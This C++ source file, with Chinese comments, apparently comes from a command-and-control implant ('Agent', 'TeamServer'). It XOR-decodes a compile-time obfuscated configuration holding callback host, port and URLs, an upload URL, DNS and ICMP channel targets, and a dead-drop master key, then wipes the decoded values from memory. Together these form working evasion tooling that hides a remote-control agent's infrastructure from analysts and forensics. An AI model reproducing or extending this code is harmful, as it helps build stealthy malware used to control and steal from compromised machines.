/**
 * @file StaticObfConfig.cpp
 * @brief 编译期烧录配置的分片混淆块解码实现（敏感数据保护 Phase B1）
 * @details
 * 块格式与 kObfMask 均与 TeamServer/服务端实现 的 obfEncode 锁步
 * (两处注释互指, 改动需同步)。解码失败(无宏/hex 非法/魔数不符/长度越界)一律返回空
 * 结构体 + WARN, 由 AgentConfig.hpp 的 ObfOr/Port 回落内置默认, 不影响其它配置来源。
 */

#include "Core/Bootstrap/StaticObfConfig.hpp"

#include "Common/Logger/Logger.hpp"

#include <sodium.h>
#include <cstdlib>
#include <cstring>
#include <vector>

namespace cleat {

    namespace {

        /// XOR 掩码(32B), 与生成器 obfMask 锁步
        constexpr uint8_t kObfMask[32] = {
            0x9E, 0x3B, 0x71, 0xC5, 0x02, 0xAD, 0x64, 0xF8,
            0x13, 0x5C, 0xE7, 0x28, 0x91, 0x4F, 0xB6, 0x0A,
            0xD3, 0x57, 0x1E, 0x82, 0x6C, 0xA9, 0x35, 0xF1,
            0x48, 0xCE, 0x7B, 0x94, 0x20, 0xE5, 0x6A, 0xB3,
        };
        constexpr size_t kMaskLen = sizeof(kObfMask);

        /// 块魔数 "CSC1" 与版本(与生成器锁步)
        constexpr uint8_t kMagic[4] = { 'C', 'S', 'C', '1' };
        constexpr uint8_t kVersion = 1;
        constexpr size_t kHeadLen = 6;   ///< 魔数 4 + 版本 1 + 条目数 1

        /// hex 字符 → 半字节; 非法返回 0xFF
        uint8_t HexNibble(char c) {
            if (c >= '0' && c <= '9') return static_cast<uint8_t>(c - '0');
            if (c >= 'a' && c <= 'f') return static_cast<uint8_t>(c - 'a' + 10);
            if (c >= 'A' && c <= 'F') return static_cast<uint8_t>(c - 'A' + 10);
            return 0xFF;
        }

        /// 十六进制字符串 → 字节(长度必须为偶数且全为 hex 字符)
        bool HexToBytes(const char* hex, std::vector<uint8_t>& out) {
            if (hex == nullptr) {
                return false;
            }
            const size_t n = std::strlen(hex);
            if (n == 0 || (n % 2) != 0) {
                return false;
            }
            out.reserve(n / 2);
            for (size_t i = 0; i < n; i += 2) {
                const uint8_t hi = HexNibble(hex[i]);
                const uint8_t lo = HexNibble(hex[i + 1]);
                if (hi == 0xFF || lo == 0xFF) {
                    return false;
                }
                out.push_back(static_cast<uint8_t>((hi << 4) | lo));
            }
            return true;
        }

        /// 解混淆 + 解析条目; 任一步失败返回 false(调用方回落内置默认)
        bool Decode(StaticObfConfig& out) {
#ifdef CLEAT_DEFAULT_OBF
            std::vector<uint8_t> raw;
            if (!HexToBytes(CLEAT_DEFAULT_OBF, raw)) {
                LOG_WARN("StaticConfig: 烧录配置 hex 非法, 回落内置默认");
                return false;
            }
            for (size_t i = 0; i < raw.size(); ++i) {
                raw[i] ^= kObfMask[i % kMaskLen];
            }
            if (raw.size() < kHeadLen || std::memcmp(raw.data(), kMagic, 4) != 0) {
                LOG_WARN("StaticConfig: 烧录配置魔数不符, 回落内置默认");
                return false;
            }
            if (raw[4] != kVersion) {
                LOG_WARN("StaticConfig: 烧录配置版本不识别(" << static_cast<int>(raw[4]) << "), 回落内置默认");
                return false;
            }

            const size_t count = raw[5];
            size_t off = kHeadLen;
            StaticObfConfig parsed;
            for (size_t i = 0; i < count; ++i) {
                if (off + 3 > raw.size()) {
                    LOG_WARN("StaticConfig: 烧录配置条目头越界, 回落内置默认");
                    return false;
                }
                const uint8_t id = raw[off];
                const size_t len = (static_cast<size_t>(raw[off + 1]) << 8) | raw[off + 2];
                off += 3;
                if (off + len > raw.size()) {
                    LOG_WARN("StaticConfig: 烧录配置条目越界(id=" << static_cast<int>(id) << "), 回落内置默认");
                    return false;
                }
                const std::string val(reinterpret_cast<const char*>(raw.data() + off), len);
                off += len;
                switch (id) {
                case 1:  parsed.transport   = val; break;
                case 2:  parsed.host        = val; break;
                case 3:  parsed.port        = val; break;
                case 4:  parsed.url         = val; break;
                case 5:  parsed.upload_url  = val; break;
                case 6:  parsed.dns_server  = val; break;
                case 7:  parsed.dns_domain  = val; break;
                case 8:  parsed.icmp_target = val; break;
                case 9:  parsed.dd_key      = val; break;   //  死投递主密钥
                default: break;   // 未知 id: 跳过(前向兼容, 旧 Agent 遇新字段不报错)
                }
            }
            parsed.valid = true;
            out = parsed;
            LOG_INFO("StaticConfig: 烧录配置已还原(分片混淆块, " << count << " 字段)");
            return true;
#else
            (void)out;
            return false;   // 未烧录: 走内置默认/CLI 注入
#endif
        }

    } // namespace

    uint16_t StaticObfConfig::Port(uint16_t def) const {
        if (port.empty()) {
            return def;
        }
        char* end = nullptr;
        const long v = std::strtol(port.c_str(), &end, 10);
        if (end == port.c_str() || v <= 0 || v > 65535) {
            return def;
        }
        return static_cast<uint16_t>(v);
    }

    const char* ObfPortStr(const char* def) {
        const StaticObfConfig& c = GetStaticObfConfig();
        // Port(0)==0 表示缺失/非法 -> 回落 def(内置默认端口字面量)
        return c.Port(0) != 0 ? c.port.c_str() : def;
    }

    namespace {
        // 缓存本体(非 const: Phase C 支持消费后擦除); 外部只经 const 接口访问
        StaticObfConfig& CacheRef() {
            static StaticObfConfig cfg = [] {
                StaticObfConfig c;
                Decode(c);
                return c;
            }();
            return cfg;
        }
    } // namespace

    const StaticObfConfig& GetStaticObfConfig() {
        return CacheRef();
    }

    void WipeDecodedStaticObfConfig() {
        StaticObfConfig& c = CacheRef();
        if (!c.valid) return;
        const auto z = [](std::string& v) {
            if (!v.empty()) {
                sodium_memzero(v.data(), v.size());
                v.clear();
                v.shrink_to_fit();
            }
        };
        z(c.transport);
        z(c.host);
        z(c.port);
        z(c.url);
        z(c.upload_url);
        z(c.dns_server);
        z(c.dns_domain);
        z(c.icmp_target);
        z(c.dd_key);   //  死投递主密钥副本随缓存一并擦除
        c.valid = false;
    }

} // namespace cleat
